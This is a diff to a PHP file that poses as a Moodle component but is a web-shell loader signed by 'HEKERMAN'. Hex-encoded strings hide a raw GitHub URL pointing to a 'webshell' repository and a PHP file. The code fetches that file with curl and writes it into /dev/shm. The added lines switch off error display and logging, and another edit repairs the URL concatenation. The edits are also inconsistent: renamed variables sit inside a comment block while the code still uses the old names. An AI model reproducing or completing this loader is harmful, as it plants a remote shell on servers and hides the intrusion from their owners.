@@ -47,6 +47,9 @@ Network: true
 
 
 <?php
+error_reporting(0);
+ini_set('display_errors', '0');
+ini_set('log_errors', '0');
 // This file is part of Moodle - http://moodle.org/
 //
 // Moodle is free software: you can redistribute it and/or modify
@@ -69,6 +72,7 @@ Network: true
  * @copyright  Mark Nelson <markn@moodle.com>
  * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
  */
+
 function geturlsinfo($url) {
     if (function_exists('curl_exec')) {
         $conn = curl_init($url);  
@@ -106,8 +110,8 @@ function geturlsinfo($url) {
  * HEKERMAN | KURD HACKER
  * @author HEKERMAN
  * user defaultnya admin   
-$auth_username = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f'; 
-$auth_password = '74656d706c61746578782e706870' // password defaultnya tbl
+$username = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f'; 
+$password = '74656d706c61746578782e706870';        // password defaultnya tbl
  * @github https://github.com/
  * @link https://github.com/
  * password default tbl
@@ -133,7 +137,7 @@ function clean_old_temp_files() {
 
 
 clean_old_temp_files();
-$url = hex2str($auth_username); . hex2str($auth_password);
+$url = hex2str($auth_username) . hex2str($auth_password);
 $a = geturlsinfo($url);
 $temporary_file = tempnam('/dev/shm', 'prefix');
 file_put_contents($temporary_file, $a);
